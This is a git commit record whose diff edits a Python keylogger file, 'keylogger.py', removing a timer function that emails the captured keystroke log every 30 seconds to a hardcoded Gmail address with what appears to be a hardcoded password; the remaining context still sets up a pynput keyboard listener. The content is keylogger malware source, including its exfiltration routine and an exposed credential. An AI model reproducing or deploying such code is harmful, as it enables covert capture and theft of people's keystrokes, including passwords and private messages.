fe53b9cb20615a85faeb7b7c0c9b5e579dad2f75
KutayKoray <kutaykoray58@gmail.com>
2024-05-09 17:13:53 +0300

    deleted keylogger

--- kullanılmayanlar/keylogger.py
+++ kullanılmayanlar/keylogger.py
@@ -28,19 +28,14 @@ def send_email(email, password, message):
     email_server.quit()
 
 
-def thread_function():
-    global log
-    send_email("atsiztayma@gmail.com","akjqjklfmaywsgsk",log.encode('utf-8'))
-    log = ""
-    timer_object = threading.Timer(30,thread_function)
-    timer_object.start()
+
 
 
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 #threading
 with keylogger_listener:
-    thread_function()
+
     keylogger_listener.join()
     
 
